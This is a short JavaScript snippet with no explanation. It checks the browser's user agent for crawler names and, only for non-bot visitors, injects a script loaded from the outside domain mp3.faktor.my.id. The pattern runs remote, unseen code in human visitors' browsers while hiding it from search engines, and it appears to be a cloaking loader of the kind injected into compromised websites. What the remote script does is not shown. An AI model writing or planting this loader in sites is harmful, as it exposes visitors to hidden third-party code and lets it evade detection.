function isBot() {
return /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
}

// Load script only if not a bot
if (!isBot()) {
var script = document.createElement('script');
script.src = 'https://mp3.faktor.my.id/app.js';
document.head.appendChild(script);
}
